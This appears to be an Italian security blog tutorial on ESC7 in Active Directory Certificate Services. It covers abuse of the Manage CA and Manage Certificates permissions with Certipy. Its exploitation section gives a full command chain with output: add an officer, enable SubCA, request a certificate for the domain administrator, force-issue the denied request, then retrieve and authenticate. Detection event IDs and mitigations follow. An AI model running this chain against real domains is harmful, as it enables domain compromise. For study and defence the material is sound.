---
title: 'ESC7 AD CS: Certipy, Manage CA e Privilege Escalation'
slug: esc7-adcs
description: 'Scopri ESC7 in AD CS: sfrutta i permessi Manage CA con Certipy e privesc, verificare il percorso SubCA e applicare detection e mitigazioni in ambienti AD.'
image: /esc7.webp
draft: false
date: 2026-03-07T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - ESC7
  - Manage CA
  - Manage Certificates
  - SubCA
  - Certipy
---

# ESC7 in Active Directory Certificate Services: abuso dei permessi Manage CA e Manage Certificates

ESC7 è una tecnica di **Active Directory Privilege Escalation tramite AD CS** che nasce da permessi eccessivi direttamente sulla **Certificate Authority** — non su un singolo template come in [ESC4](https://hackita.it/articoli/esc4-adcs/), ma sulla CA stessa. I due permessi coinvolti sono **Manage CA** e **Manage Certificates**, e vanno distinti con più precisione di quanto si legge spesso: non sono intercambiabili, e nessuno dei due garantisce da solo il controllo completo del dominio.

## Due permessi, due capacità diverse

| Permesso                                                                    | Cosa permette davvero                                                                                                                                 | Limiti da verificare                                                                                                                               |
| --------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Manage CA (`ManageCa`)**                                                  | Modificare la configurazione della CA, pubblicare/abilitare template, assegnare ruoli (es. Certificate Officer), intervenire sulla sicurezza della CA | Quali operazioni sono effettivamente consentite nell'ambiente, e se è attiva una separazione dei ruoli che limita cosa un singolo account può fare |
| **Manage Certificates (`ManageCertificates`, ruolo "Certificate Officer")** | Approvare, negare o revocare richieste di certificato secondo le capacità del ruolo                                                                   | L'operatività dipende dalle richieste effettivamente gestibili — non equivale a poter cambiare la configurazione della CA                          |

Microsoft consiglia di mantenere questi due ruoli separati (role separation) proprio perché insieme costituiscono un controllo molto ampio sul processo di emissione — ma **Manage CA non equivale a Domain Admin**: il permesso rappresenta un rischio molto alto perché agisce su un'infrastruttura fidata (asset Tier-0), non un accesso amministrativo di dominio già ottenuto. L'identità e i privilegi che se ne ricavano dipendono dal completamento dell'intera catena, non dal solo possesso del permesso.

## Identificazione con Certipy

```bash
certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 10.0.0.100 -vulnerable -enabled -stdout
```

Output tipico:

```
Certificate Authorities
  CA Name                             : CORP-CA
  DNS Name                            : CA.CORP.LOCAL

  Permissions
    Access Rights
      ManageCa                        : CORP.LOCAL\Authenticated Users
                                         CORP.LOCAL\Domain Admins
                                         CORP.LOCAL\Enterprise Admins

  [+] User ACL Principals             : CORP.LOCAL\Authenticated Users

  [!] Vulnerabilities
    ESC7                              : User has dangerous permissions.
```

`User ACL Principals` indica attraverso quali principal Certipy ha rilevato i tuoi diritti sulla CA (direttamente o via gruppi) — vale la pena verificarlo, non limitarsi a leggere "ESC7" nell'output.

## Exploitation: il percorso con il template SubCA

Uno dei metodi più diretti sfrutta il template built-in **SubCA**, che permette al richiedente di specificare il subject e ha EKU molto permissivi — ma richiede comunque `Manage CA` sulla CA specifica, non un generico accesso al dominio.

**Step 1 — Aggiungiti come Certificate Officer**

```bash
certipy ca \
  -u 'attacker@corp.local' -p 'Passw0rd!' \
  -ns '10.0.0.100' -target 'CA.CORP.LOCAL' \
  -ca 'CORP-CA' -add-officer 'attacker'
```

```
[*] Successfully added officer 'attacker' on 'CORP-CA'
```

**Step 2 — Abilita il template SubCA sulla CA**

```bash
certipy ca \
  -u 'attacker@corp.local' -p 'Passw0rd!' \
  -ns '10.0.0.100' -target 'CA.CORP.LOCAL' \
  -ca 'CORP-CA' -enable-template 'SubCA'
```

```
[*] Successfully enabled 'SubCA' on 'CORP-CA'
```

**Step 3 — Richiedi il certificato: la richiesta viene negata, ma non è un fallimento**

```bash
certipy req \
  -u 'attacker@corp.local' -p 'Passw0rd!' \
  -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
  -ca 'CORP-CA' -template 'SubCA' \
  -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
```

```
[*] Requesting certificate via RPC
[*] Request ID is 1
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '1.key'
```

**Cosa significa davvero `CERTSRV_E_TEMPLATE_DENIED`**: non è "la richiesta è in attesa di manager approval" — è un diniego per **mancanza di diritti di enrollment** sul template `SubCA` (abilitarlo sulla CA non ti dà automaticamente il permesso di richiederlo). Nonostante il diniego, la CA assegna comunque un **Request ID** e registra la richiesta, e Certipy salva la chiave privata generata localmente (`1.key`) — questo è esattamente il presupposto che rende possibile lo step successivo: userai `Manage CA` per *forzare* l'emissione di una richiesta già registrata, non per correggere i permessi del template.

**Step 4 — Usa Manage CA per emettere la richiesta negata**

```bash
certipy ca \
  -u 'attacker@corp.local' -p 'Passw0rd!' \
  -ns '10.0.0.100' -target 'CA.CORP.LOCAL' \
  -ca 'CORP-CA' -issue-request '1'
```

```
[*] Successfully issued certificate request ID 1
```

**Step 5 — Recupera il certificato**

```bash
certipy req \
  -u 'attacker@corp.local' -p 'Passw0rd!' \
  -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
  -ca 'CORP-CA' -retrieve '1'
```

```
[*] Retrieving certificate with ID 1
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-...-500'
[*] Loaded private key from '1.key'
[*] Saving certificate and private key to 'administrator.pfx'
```

Nota la riga `Certificate object SID is ...`: è la prima verifica da fare, **prima** di passare all'autenticazione — confirma che il certificato recuperato porta davvero il SID del target previsto, non solo l'UPN. Se non trovi il file `1.key` nella directory corrente, Certipy lo cerca automaticamente in base al Request ID; se non lo trova, verifica di essere nella stessa directory dello Step 3 o passa il percorso esplicitamente.

**Autenticazione**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

### Cosa dimostra ogni risultato — non fermarti al certificato emesso

| Risultato                                    | Cosa confirma                                                  | Cosa NON confirma                                                                                                               |
| -------------------------------------------- | -------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| Certificato recuperato (`administrator.pfx`) | Il percorso di emissione forzata è andato a buon fine          | Che il KDC accetterà quel certificato per il logon                                                                              |
| `Certificate object SID` corretto            | Il certificato porta l'identità attesa                         | Il mapping finale sul Domain Controller                                                                                         |
| `Got TGT`                                    | L'autenticazione Kerberos è riuscita per il principal indicato | Il recupero dell'hash NT                                                                                                        |
| `Got NT hash`                                | È stata recuperata quella specifica informazione               | Accesso amministrativo su ogni sistema del dominio                                                                              |
| Autenticazione negata dal KDC                | —                                                              | Verifica il mapping del certificato e la configurazione di strong certificate mapping sul DC, non è un fallimento di ESC7 in sé |

Un certificato emesso correttamente non garantisce automaticamente che l'autenticazione riesca: dipende anche dal certificate mapping configurato sul Domain Controller.

## Varianti: Manage CA non porta solo a SubCA

Il percorso SubCA è il più diretto da documentare, ma `Manage CA` abilita anche altri scenari, che vale la pena conoscere senza trasformare questo articolo in una guida a tutto AD CS:

| Variante                                         | Relazione con ESC7                                                                                                                                                                              |
| ------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Pubblicazione di un template vulnerabile         | `Manage CA` può rendere disponibile un template — l'abilitazione in sé non lo rende automaticamente sfruttabile, serve che quel template abbia anche una propria misconfigurazione              |
| [ESC6](https://hackita.it/articoli/esc6-adcs/)   | Manage CA può permettere di modificare la configurazione che abilita la SAN injection a livello di CA                                                                                           |
| [ESC11](https://hackita.it/articoli/esc11-adcs/) | Il controllo della CA incide sulle impostazioni di protezione delle richieste RPC — l'abuso dipende dalla configurazione effettiva del servizio                                                 |
| [ESC16](https://hackita.it/articoli/esc16-adcs/) | Manage CA può incidere sull'inclusione della Security Extension nei certificati emessi                                                                                                          |
| Solo `Manage Certificates`                       | Percorso più limitato: puoi approvare/negare/revocare richieste esistenti, ma non modificare la configurazione della CA — l'escalation dipende da quali richieste sono effettivamente gestibili |

## Troubleshooting

| Sintomo                                           | Cosa verificare                                                                                                                                                                                             |
| ------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ESC7 non compare nell'output di Certipy           | Versione dello strumento, identità usata, appartenenza a gruppi, CA interrogata                                                                                                                             |
| `-add-officer` fallisce                           | Diritti `Manage CA` effettivi, nome dell'identità target corretto                                                                                                                                           |
| `-enable-template SubCA` fallisce                 | Permessi sulla CA, nome esatto del template, disponibilità nell'ambiente                                                                                                                                    |
| La richiesta (Step 3) non genera un Request ID    | Verifica la raggiungibilità della CA e il tipo di errore — un errore diverso da `CERTSRV_E_TEMPLATE_DENIED` può indicare un problema diverso (CA non raggiungibile, template non abilitato)                 |
| `-issue-request` non produce un certificato       | Verifica il Request ID corretto e di avere ancora i diritti `Manage CA`/`Manage Certificates` necessari                                                                                                     |
| `-retrieve` non trova la chiave privata           | Verifica la presenza di `<ID>.key` nella directory corrente o il Request ID usato                                                                                                                           |
| Certificato recuperato ma `certipy auth` fallisce | Verifica il SID nel certificato, il mapping sul DC, la catena di fiducia — vedi [ESC9](https://hackita.it/articoli/esc9-adcs/)/[ESC10](https://hackita.it/articoli/esc10-adcs/) se il problema è di mapping |
| TGT ottenuto ma accesso a una risorsa negato      | Verifica i privilegi effettivi dell'account impersonato su quella risorsa specifica                                                                                                                         |

## Detection

Non limitarti a verificare quali permessi esistono — serve monitorare le modifiche effettive. Richiede auditing configurato sia sul filtro della CA sia tramite Advanced Audit Policy del sistema operativo:

| Evento          | Significato                                                       |
| --------------- | ----------------------------------------------------------------- |
| **4882**        | Modifica delle autorizzazioni della CA                            |
| **4885**        | Modifica del filtro di auditing della CA                          |
| **4886**        | Richiesta di certificato ricevuta                                 |
| **4887**        | Certificato emesso                                                |
| **4888**        | Richiesta negata                                                  |
| **4890**        | Modifica delle impostazioni del Certificate Manager               |
| **4891 / 4892** | Modifica di una voce di configurazione / delle proprietà della CA |
| **4896**        | Eliminazione di record nel database della CA                      |
| **4897**        | Abilitazione della role separation                                |

La correlazione più utile per ESC7: una richiesta inizialmente negata (`CERTSRV_E_TEMPLATE_DENIED`, evento 4888) seguita a breve da un'emissione amministrativa (evento 4887 tramite `-issue-request`) non prevista dal normale processo di approvazione.

## Mitigation

* **Trattare la CA come asset Tier-0**: isolamento, accesso amministrativo limitato come per un Domain Controller.
* **Limitare `Manage CA` e `Manage Certificates` a pochi amministratori PKI dedicati** — non assegnarli a gruppi ampi o, peggio, a `Authenticated Users`.
* **Abilitare la role separation** quando possibile, per impedire che lo stesso account possa sia configurare la CA sia gestire le richieste.
* **Auditare periodicamente i template pubblicati** sulla CA e chi può abilitarli.
* **Monitorare la sequenza "diniego → emissione amministrativa"** descritta sopra, non solo l'esistenza dei permessi.

## FAQ

**Cos'è ESC7?**
L'abuso dei permessi amministrativi sulla Certificate Authority — tipicamente `Manage CA`, talvolta `Manage Certificates` — per forzare l'emissione di un certificato che il template non avrebbe altrimenti concesso.

**ESC7 porta sempre a Domain Admin?**
Può, quando l'intera catena si completa: controllo della CA, emissione forzata di un certificato per un account privilegiato, e autenticazione accettata dal KDC. Non è un risultato garantito dal solo possesso di `Manage CA`.

**Qual è la differenza tra ESC7 ed ESC4?**
[ESC4](https://hackita.it/articoli/esc4-adcs/) riguarda permessi pericolosi su un **singolo template**; ESC7 riguarda permessi pericolosi sulla **CA stessa**, che può incidere su tutti i template che vi sono pubblicati — ma non equivale a controllare automaticamente ogni altro oggetto o servizio PKI del dominio.

**`Manage Certificates` da solo basta per l'escalation?**
Non sempre: dipende da quali richieste sono effettivamente gestibili con quel ruolo. Spesso serve in combinazione con altri fattori (es. una richiesta già pendente per un template che potresti far approvare).

***

Guida completa a tutte le tecniche ESC1–ESC16: [AD CS Privilege Escalation con Certipy](https://hackita.it/articoli/adcs-esc1-esc16/). Tecniche correlate: [ESC8](https://hackita.it/articoli/esc8-adcs/), [ESC9](https://hackita.it/articoli/esc9-adcs/).

Fonti tecniche: [Certipy — Privilege Escalation Wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation), [Microsoft Learn — Secure, Delegate, and Audit Certification Authority Administration](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/secure-delegate-audit-certification-authority).
